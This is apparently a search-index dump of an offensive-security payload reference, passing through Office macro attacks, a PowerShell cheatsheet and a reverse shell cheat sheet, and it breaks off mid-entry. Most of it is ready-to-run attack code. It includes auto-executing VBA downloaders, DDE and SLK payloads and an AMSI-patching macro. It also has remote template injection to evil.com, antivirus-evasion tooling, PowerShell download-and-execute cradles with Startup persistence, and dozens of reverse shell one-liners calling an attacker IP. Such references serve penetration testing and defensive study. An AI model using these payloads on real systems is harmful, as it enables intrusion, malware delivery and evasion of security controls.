If CreateObject(\"Scripting.FileSystemObject\").FolderExists(CreateObject(\"Scripting.FileSystemObject\").GetParentFolderName(DownloadPath)) = False Then Exit Function Dim returnValue As Long returnValue = URLDownloadToFile(0, URL, DownloadPath, 0, 0) 'If return value is 0 and the file exist, then it is considered as downloaded correctly DownloadFileA = (returnValue = 0) And (Len(Dir(DownloadPath)) > 0) Exit Function Failed: End Function Sub AutoOpen() DownloadFileA \"http://10.10.10.10/macro.exe\", \"C:\\\\Users\\\\Public\\\\beacon.exe\" End Sub Sub Auto_Open() DownloadFileA \"http://10.10.10.10/macro.exe\", \"C:\\\\Users\\\\Public\\\\beacon.exe\" End Sub","title":"DOCM - MMG with Custom DL + Exec"},{"location":"Methodology%20and%20Resources/Office%20-%20Attacks/#docm-activex-based-inkpicture-control-painted-event-autorun-macro","text":"Go to Developer tab on ribbon -> Insert -> More Controls -> Microsoft InkPicture Control Private Sub InkPicture1_Painted(ByVal hDC As Long, ByVal Rect As MSINKAUTLib.IInkRectangle) Run = Shell(\"cmd.exe /c PowerShell (New-Object System.Net.WebClient).DownloadFile('https://<host>/file.exe','file.exe');Start-Process 'file.exe'\", vbNormalFocus) End Sub","title":"DOCM - ActiveX-based (InkPicture control, Painted event) Autorun macro"},{"location":"Methodology%20and%20Resources/Office%20-%20Attacks/#vba-obfuscation","text":"# https://www.youtube.com/watch?v=L0DlPOLx2k0 $ git clone https://github.com/bonnetn/vba-obfuscator $ cat example_macro/download_payload.vba | docker run -i --rm bonnetn/vba-obfuscator /dev/stdin","title":"VBA Obfuscation"},{"location":"Methodology%20and%20Resources/Office%20-%20Attacks/#vba-purging","text":"VBA Stomping : This technique allows attackers to remove compressed VBA code from Office documents and still execute malicious macros without many of the VBA keywords that AV engines had come to rely on for detection. == Removes P-code. :warning: VBA stomping is not effective against Excel 97-2003 Workbook (.xls) format.","title":"VBA Purging"},{"location":"Methodology%20and%20Resources/Office%20-%20Attacks/#officepurge","text":"https://github.com/fireeye/OfficePurge/releases/download/v1.0/OfficePurge.exe OfficePurge.exe -d word -f .\\malicious.doc -m NewMacros OfficePurge.exe -d excel -f .\\payroll.xls -m Module1 OfficePurge.exe -d publisher -f .\\donuts.pub -m ThisDocument OfficePurge.exe -d word -f .\\malicious.doc -l","title":"OfficePurge"},{"location":"Methodology%20and%20Resources/Office%20-%20Attacks/#evilclippy","text":"Evil Clippy uses the OpenMCDF library to manipulate CFBF files. Evil Clippy compiles perfectly fine with the Mono C# compiler and has been tested on Linux, OSX and Windows. If you want to manipulate CFBF files manually, then FlexHEX is one of the best editors for this. # OSX/Linux mcs /reference:OpenMcdf.dll,System.IO.Compression.FileSystem.dll /out:EvilClippy.exe *.cs # Windows csc /reference:OpenMcdf.dll,System.IO.Compression.FileSystem.dll /out:EvilClippy.exe *.cs EvilClippy.exe -s fake.vbs -g -r cobaltstrike.doc EvilClippy.exe -s fakecode.vba -t 2016x86 macrofile.doc EvilClippy.exe -s fakecode.vba -t 2013x64 macrofile.doc # make macro code unaccessible is to mark the project as locked and unviewable: -u # Evil Clippy can confuse pcodedmp and many other analysis tools with the -r flag. EvilClippy.exe -r macrofile.doc","title":"EvilClippy"},{"location":"Methodology%20and%20Resources/Office%20-%20Attacks/#vba-offensive-security-template","text":"Reverse Shell VBA - https://github.com/JohnWoodman/VBA-Macro-Reverse-Shell/blob/main/VBA-Reverse-Shell.vba Process Dumper - https://github.com/JohnWoodman/VBA-Macro-Dump-Process RunPE - https://github.com/itm4n/VBA-RunPE Spoof Parent - https://github.com/py7hagoras/OfficeMacro64 AMSI Bypass - https://github.com/outflanknl/Scripts/blob/master/AMSIbypasses.vba amsiByPassWithRTLMoveMemory - https://gist.github.com/DanShaqFu/1c57c02660b2980d4816d14379c2c4f3 VBA macro spawning a process with a spoofed parent - https://github.com/christophetd/spoofing-office-macro/blob/master/macro64.vba","title":"VBA - Offensive Security Template"},{"location":"Methodology%20and%20Resources/Office%20-%20Attacks/#vba-amsi","text":"The Office VBA integration with AMSI is made up of three parts: (a) logging macro behavior, (b) triggering a scan on suspicious behavior, and (c) stopping a malicious macro upon detection. https://www.microsoft.com/security/blog/2018/09/12/office-vba-amsi-parting-the-veil-on-malicious-macros/ :warning: It appears that p-code based attacks where the VBA code is stomped will still be picked up by the AMSI engine (e.g. files manipulated by our tool EvilClippy). The AMSI engine only hooks into VBA, we can bypass it by using Excel 4.0 Macro AMSI Trigger - https://github.com/synacktiv/AMSI-Bypass Private Declare PtrSafe Function GetProcAddress Lib \"kernel32\" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr Private Declare PtrSafe Function LoadLibrary Lib \"kernel32\" Alias \"LoadLibraryA\" (ByVal lpLibFileName As String) As LongPtr Private Declare PtrSafe Function VirtualProtect Lib \"kernel32\" (lpAddress As Any, ByVal dwSize As LongPtr, ByVal flNewProtect As Long, lpflOldProtect As Long) As Long Private Declare PtrSafe Sub CopyMemory Lib \"kernel32\" Alias \"RtlMoveMemory\" (Destination As Any, Source As Any, ByVal Length As LongPtr) Private Sub Document_Open() Dim AmsiDLL As LongPtr Dim AmsiScanBufferAddr As LongPtr Dim result As Long Dim MyByteArray(6) As Byte Dim ArrayPointer As LongPtr MyByteArray(0) = 184 ' 0xB8 MyByteArray(1) = 87 ' 0x57 MyByteArray(2) = 0 ' 0x00 MyByteArray(3) = 7 ' 0x07 MyByteArray(4) = 128 ' 0x80 MyByteArray(5) = 195 ' 0xC3 AmsiDLL = LoadLibrary(\"amsi.dll\") AmsiScanBufferAddr = GetProcAddress(AmsiDLL, \"AmsiScanBuffer\") result = VirtualProtect(ByVal AmsiScanBufferAddr, 5, 64, 0) ArrayPointer = VarPtr(MyByteArray(0)) CopyMemory ByVal AmsiScanBufferAddr, ByVal ArrayPointer, 6 End Sub","title":"VBA - AMSI"},{"location":"Methodology%20and%20Resources/Office%20-%20Attacks/#docx-template-injection","text":":warning: Does not require \"Enable Macro\"","title":"DOCX - Template Injection"},{"location":"Methodology%20and%20Resources/Office%20-%20Attacks/#remote-template","text":"A malicious macro is saved in a Word template .dotm file Benign .docx file is created based on one of the default MS Word Document templates Document from step 2 is saved as .docx Document from step 3 is renamed to .zip Document from step 4 gets unzipped .\\word_rels\\settings.xml.rels contains a reference to the template file. That reference gets replaced with a reference to our malicious macro created in step 1. File can be hosted on a web server (http) or webdav (smb). xml <?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?> <Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\"><Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate\" Target=\"file:///C:\\Users\\mantvydas\\AppData\\Roaming\\Microsoft\\Templates\\Polished%20resume,%20designed%20by%20MOO.dotx\" TargetMode=\"External\"/></Relationships> xml <?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\"><Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate\" Target=\"https://evil.com/malicious.dotm\" TargetMode=\"External\"/></Relationships> File gets zipped back up again and renamed to .docx","title":"Remote Template"},{"location":"Methodology%20and%20Resources/Office%20-%20Attacks/#template-injections-tools","text":"https://github.com/JohnWoodman/remoteInjector https://github.com/ryhanson/phishery $ phishery -u https://secure.site.local/docs -i good.docx -o bad.docx [+] Opening Word document: good.docx [+] Setting Word document template to: https://secure.site.local/docs [+] Saving injected Word document to: bad.docx [*] Injected Word document has been saved!","title":"Template Injections Tools"},{"location":"Methodology%20and%20Resources/Office%20-%20Attacks/#docx-dde","text":"Insert > QuickPart > Field Right Click > Toggle Field Code { DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe \"/k calc.exe\" }","title":"DOCX - DDE"},{"location":"Methodology%20and%20Resources/Office%20-%20Attacks/#slk-excel","text":"ID;P O;E NN;NAuto_open;ER101C1;KOut Flank;F C;X1;Y101;K0;EEXEC(\"c:\\shell.cmd\") C;X1;Y102;K0;EHALT() E","title":"SLK - Excel"},{"location":"Methodology%20and%20Resources/Office%20-%20Attacks/#references","text":"VBA RunPE Part 1 - itm4n VBA RunPE Part 2 - itm4n Office VBA AMSI Parting the veil on malicious macros - Microsoft Bypassing AMSI fro VBA - Outflank Evil Clippy MS Office Maldoc Assistant - Outflank Old schoold evil execl 4.0 macros XLM - Outflank Excel 4 Macro Generator x86/x64 - bytecod3r VBad - Pepitoh Excel 4.0 Macro Function Reference PDF Excel 4.0 Macros so hot right now - SneekyMonkey Macros and more with sharpshooter v2.0 - mdsec Further evasion in the forgotten corners of ms xls - malware.pizza Excel 4.0 macro old but new - fsx30 XLS 4.0 macros and covenant - d-sec Inject macro from a remote dotm template - ired.team Phishinh with OLE - ired.team Phishing SLK - ired.team bypassing-malicious-macro-detections-by-defeating-child-parent-process-relationships) PropertyBomb an old new technique for arbitrary code execution in vba macro - Leon Berlin - 22 May 2018 AMSI in the heap - rmdavy WordAMSIBypass - rmdavy Dechaining macros and evading EDR - Noora Hyv\u00e4rinen Executing macros from docx with remote - RedXORBlueJuly 18, 2018 One thousand and one ways to copy your shellcode to memory (VBA Macros) - X-C3LL - Feb 18, 2021 Running macros via ActiveX controls - greyhathacker - September 29, 2016 Anti-Analysis Techniques Used in Excel 4.0 Macros - 24 March 2021 - @Jacob_Pimental","title":"References"},{"location":"Methodology%20and%20Resources/Powershell%20-%20Cheatsheet/","text":"Powershell Summary Execution Policy Encoded Commands Download file Load Powershell scripts Load C# assembly reflectively Secure String to Plaintext References Execution Policy powershell -EncodedCommand $encodedCommand powershell -ep bypass ./PowerView.ps1 # Change execution policy Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted Set-ExecutionPolicy Bypass -Scope Process Constrained Mode # Check if we are in a constrained mode # Values could be: FullLanguage or ConstrainedLanguage $ExecutionContext.SessionState.LanguageMode ## Bypass powershell -version 2 Encoded Commands Windows ps1 $command = 'IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.10.10/PowerView.ps1\")' $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) Linux: :warning: UTF-16LE encoding is required ps1 echo 'IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.10.10/PowerView.ps1\")' | iconv -t utf-16le | base64 -w 0 Download file # Any version (New-Object System.Net.WebClient).DownloadFile(\"http://10.10.10.10/PowerView.ps1\", \"C:\\Windows\\Temp\\PowerView.ps1\") wget \"http://10.10.10.10/taskkill.exe\" -OutFile \"C:\\ProgramData\\unifivideo\\taskkill.exe\" Import-Module BitsTransfer; Start-BitsTransfer -Source $url -Destination $output # Powershell 4+ IWR \"http://10.10.10.10/binary.exe\" -OutFile \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\binary.exe\" Invoke-WebRequest \"http://10.10.10.10/binary.exe\" -OutFile \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\binary.exe\" Load Powershell scripts # Proxy-aware IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/PowerView.ps1') echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10/PowerView.ps1') | powershell -noprofile - powershell -exec bypass -c \"(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.10.10.10/PowerView.ps1')|iex\" # Non-proxy aware $h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://10.10.10.10/PowerView.ps1',$false);$h.send();iex $h.responseText Load C# assembly reflectively # Download and run assembly without arguments $data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/rev.exe') $assem = [System.Reflection.Assembly]::Load($data) [rev.Program]::Main() # Download and run Rubeus, with arguments (make sure to split the args) $data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/Rubeus.exe') $assem = [System.Reflection.Assembly]::Load($data) [Rubeus.Program]::Main(\"s4u /user:web01$ /rc4:1d77f43d9604e79e5626c6905705801e /impersonateuser:administrator /msdsspn:cifs/file01 /ptt\".Split()) # Execute a specific method from an assembly (e.g. a DLL) $data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/lib.dll') $assem = [System.Reflection.Assembly]::Load($data) $class = $assem.GetType(\"ClassLibrary1.Class1\") $method = $class.GetMethod(\"runner\") $method.Invoke(0, $null) Secure String to Plaintext $pass = \"01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692\" | convertto-securestring $user = \"HTB\\Tom\" $cred = New-Object System.management.Automation.PSCredential($user, $pass) $cred.GetNetworkCredential() | fl UserName : Tom Password : 1ts-mag1c!!! SecurePassword : System.Security.SecureString Domain : HTB References Windows & Active Directory Exploitation Cheat Sheet and Command Reference - @chvancooten Basic PowerShell for Pentesters - HackTricks","title":"Powershell"},{"location":"Methodology%20and%20Resources/Powershell%20-%20Cheatsheet/#powershell","text":"","title":"Powershell"},{"location":"Methodology%20and%20Resources/Powershell%20-%20Cheatsheet/#summary","text":"Execution Policy Encoded Commands Download file Load Powershell scripts Load C# assembly reflectively Secure String to Plaintext References","title":"Summary"},{"location":"Methodology%20and%20Resources/Powershell%20-%20Cheatsheet/#execution-policy","text":"powershell -EncodedCommand $encodedCommand powershell -ep bypass ./PowerView.ps1 # Change execution policy Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted Set-ExecutionPolicy Bypass -Scope Process","title":"Execution Policy"},{"location":"Methodology%20and%20Resources/Powershell%20-%20Cheatsheet/#constrained-mode","text":"# Check if we are in a constrained mode # Values could be: FullLanguage or ConstrainedLanguage $ExecutionContext.SessionState.LanguageMode ## Bypass powershell -version 2","title":"Constrained Mode"},{"location":"Methodology%20and%20Resources/Powershell%20-%20Cheatsheet/#encoded-commands","text":"Windows ps1 $command = 'IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.10.10/PowerView.ps1\")' $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) Linux: :warning: UTF-16LE encoding is required ps1 echo 'IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.10.10/PowerView.ps1\")' | iconv -t utf-16le | base64 -w 0","title":"Encoded Commands"},{"location":"Methodology%20and%20Resources/Powershell%20-%20Cheatsheet/#download-file","text":"# Any version (New-Object System.Net.WebClient).DownloadFile(\"http://10.10.10.10/PowerView.ps1\", \"C:\\Windows\\Temp\\PowerView.ps1\") wget \"http://10.10.10.10/taskkill.exe\" -OutFile \"C:\\ProgramData\\unifivideo\\taskkill.exe\" Import-Module BitsTransfer; Start-BitsTransfer -Source $url -Destination $output # Powershell 4+ IWR \"http://10.10.10.10/binary.exe\" -OutFile \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\binary.exe\" Invoke-WebRequest \"http://10.10.10.10/binary.exe\" -OutFile \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\binary.exe\"","title":"Download file"},{"location":"Methodology%20and%20Resources/Powershell%20-%20Cheatsheet/#load-powershell-scripts","text":"# Proxy-aware IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/PowerView.ps1') echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10/PowerView.ps1') | powershell -noprofile - powershell -exec bypass -c \"(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.10.10.10/PowerView.ps1')|iex\" # Non-proxy aware $h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://10.10.10.10/PowerView.ps1',$false);$h.send();iex $h.responseText","title":"Load Powershell scripts"},{"location":"Methodology%20and%20Resources/Powershell%20-%20Cheatsheet/#load-c-assembly-reflectively","text":"# Download and run assembly without arguments $data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/rev.exe') $assem = [System.Reflection.Assembly]::Load($data) [rev.Program]::Main() # Download and run Rubeus, with arguments (make sure to split the args) $data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/Rubeus.exe') $assem = [System.Reflection.Assembly]::Load($data) [Rubeus.Program]::Main(\"s4u /user:web01$ /rc4:1d77f43d9604e79e5626c6905705801e /impersonateuser:administrator /msdsspn:cifs/file01 /ptt\".Split()) # Execute a specific method from an assembly (e.g. a DLL) $data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/lib.dll') $assem = [System.Reflection.Assembly]::Load($data) $class = $assem.GetType(\"ClassLibrary1.Class1\") $method = $class.GetMethod(\"runner\") $method.Invoke(0, $null)","title":"Load C# assembly reflectively"},{"location":"Methodology%20and%20Resources/Powershell%20-%20Cheatsheet/#secure-string-to-plaintext","text":"$pass = \"01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692\" | convertto-securestring $user = \"HTB\\Tom\" $cred = New-Object System.management.Automation.PSCredential($user, $pass) $cred.GetNetworkCredential() | fl UserName : Tom Password : 1ts-mag1c!!! SecurePassword : System.Security.SecureString Domain : HTB","title":"Secure String to Plaintext"},{"location":"Methodology%20and%20Resources/Powershell%20-%20Cheatsheet/#references","text":"Windows & Active Directory Exploitation Cheat Sheet and Command Reference - @chvancooten Basic PowerShell for Pentesters - HackTricks","title":"References"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/","text":"Reverse Shell Cheat Sheet Summary Tools Reverse Shell Awk Automatic Reverse Shell Generator Bash TCP Bash UDP C Dart Golang Groovy Alternative 1 Groovy Java Alternative 1 Java Alternative 2 Java Lua Ncat Netcat OpenBsd Netcat BusyBox Netcat Traditional NodeJS OpenSSL Perl PHP Powershell Python Ruby Socat Telnet War Meterpreter Shell Windows Staged reverse TCP Windows Stageless reverse TCP Linux Staged reverse TCP Linux Stageless reverse TCP Other platforms Spawn TTY Shell References Tools reverse-shell-generator - Hosted Reverse Shell generator ( source ) revshellgen - CLI Reverse Shell generator Reverse Shell Bash TCP bash -i >& /dev/tcp/10.0.0.1/4242 0>&1 0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196 /bin/bash -l > /dev/tcp/10.0.0.1/4242 0<&1 2>&1 Bash UDP Victim: sh -i >& /dev/udp/10.0.0.1/4242 0>&1 Listener: nc -u -lvp 4242 Don't forget to check with others shell : sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, bash Socat user@attack$ socat file:`tty`,raw,echo=0 TCP-L:4242 user@victim$ /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242 user@victim$ wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242 Static socat binary can be found at https://github.com/andrew-d/static-binaries Perl perl -e 'use Socket;$i=\"10.0.0.1\";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};' perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"10.0.0.1:4242\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;' NOTE: Windows only perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,\"10.0.0.1:4242\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;' Python Linux only IPv4 export RHOST=\"10.0.0.1\";export RPORT=4242;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")' python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")' python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])' python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())' IPv4 (No Spaces) python -c 'socket=__import__(\"socket\");os=__import__(\"os\");pty=__import__(\"pty\");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")' python -c 'socket=__import__(\"socket\");subprocess=__import__(\"subprocess\");os=__import__(\"os\");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])' python -c 'socket=__import__(\"socket\");subprocess=__import__(\"subprocess\");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())' IPv4 (No Spaces, Shortened) python -c 'a=__import__;s=a(\"socket\");o=a(\"os\").dup2;p=a(\"pty\").spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect((\"10.0.0.1\",4242));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(\"/bin/sh\")' python -c 'a=__import__;b=a(\"socket\");p=a(\"subprocess\").call;o=a(\"os\").dup2;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p([\"/bin/sh\",\"-i\"])' python -c 'a=__import__;b=a(\"socket\");c=a(\"subprocess\").call;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));f=s.fileno;c([\"/bin/sh\",\"-i\"],stdin=f(),stdout=f(),stderr=f())' IPv4 (No Spaces, Shortened Further) python -c 'a=__import__;s=a(\"socket\").socket;o=a(\"os\").dup2;p=a(\"pty\").spawn;c=s();c.connect((\"10.0.0.1\",4242));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(\"/bin/sh\")' python -c 'a=__import__;b=a(\"socket\").socket;p=a(\"subprocess\").call;o=a(\"os\").dup2;s=b();s.connect((\"10.0.0.1\",4242));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p([\"/bin/sh\",\"-i\"])' python -c 'a=__import__;b=a(\"socket\").socket;c=a(\"subprocess\").call;s=b();s.connect((\"10.0.0.1\",4242));f=s.fileno;c([\"/bin/sh\",\"-i\"],stdin=f(),stdout=f(),stderr=f())' IPv6 python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((\"dead:beef:2::125c\",4242,0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")' IPv6 (No Spaces) python -c 'socket=__import__(\"socket\");os=__import__(\"os\");pty=__import__(\"pty\");s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((\"dead:beef:2::125c\",4242,0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")' IPv6 (No Spaces, Shortened) python -c 'a=__import__;c=a(\"socket\");o=a(\"os\").dup2;p=a(\"pty\").spawn;s=c.socket(c.AF_INET6,c.SOCK_STREAM);s.connect((\"dead:beef:2::125c\",4242,0,2));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p(\"/bin/sh\")' Windows only C:\\Python27\\python.exe -c \"(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.0.0.1', 4242)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\\\windows\\\\system32\\\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))\" PHP php -r '$sock=fsockopen(\"10.0.0.1\",4242);exec(\"/bin/sh -i <&3 >&3 2>&3\");' php -r '$sock=fsockopen(\"10.0.0.1\",4242);shell_exec(\"/bin/sh -i <&3 >&3 2>&3\");' php -r '$sock=fsockopen(\"10.0.0.1\",4242);`/bin/sh -i <&3 >&3 2>&3`;' php -r '$sock=fsockopen(\"10.0.0.1\",4242);system(\"/bin/sh -i <&3 >&3 2>&3\");' php -r '$sock=fsockopen(\"10.0.0.1\",4242);passthru(\"/bin/sh -i <&3 >&3 2>&3\");' php -r '$sock=fsockopen(\"10.0.0.1\",4242);popen(\"/bin/sh -i <&3 >&3 2>&3\", \"r\");' php -r '$sock=fsockopen(\"10.0.0.1\",4242);$proc=proc_open(\"/bin/sh -i\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);' Ruby ruby -rsocket -e'f=TCPSocket.open(\"10.0.0.1\",4242).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)' ruby -rsocket -e'exit if fork;c=TCPSocket.new(\"10.0.0.1\",\"4242\");loop{c.gets.chomp!;(exit! if $_==\"exit\");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts \"failed: #{$_}\"}' NOTE: Windows only ruby -rsocket -e 'c=TCPSocket.new(\"10.0.0.1\",\"4242\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end' Golang echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"10.0.0.1:4242\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go Netcat Traditional nc -e /bin/sh 10.0.0.1 4242 nc -e /bin/bash 10.0.0.1 4242 nc -c bash 10.0.0.1 4242 Netcat OpenBsd rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f Netcat BusyBox rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f Ncat ncat 10.0.0.1 4242 -e /bin/bash ncat --udp 10.0.0.1 4242 -e /bin/bash OpenSSL Attacker: user@attack$ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes user@attack$ openssl s_server -quiet -key key.pem -cert cert.pem -port 4242 or user@attack$ ncat --ssl -vv -l -p 4242 user@victim$ mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.0.0.1:4242 > /tmp/s; rm /tmp/s TLS-PSK (does not rely on PKI or self-signed certificates) # generate 384-bit PSK # use the generated string as a value for the two PSK variables from below openssl rand -hex 48 # server (attacker) export LHOST=\"*\"; export LPORT=\"4242\"; export 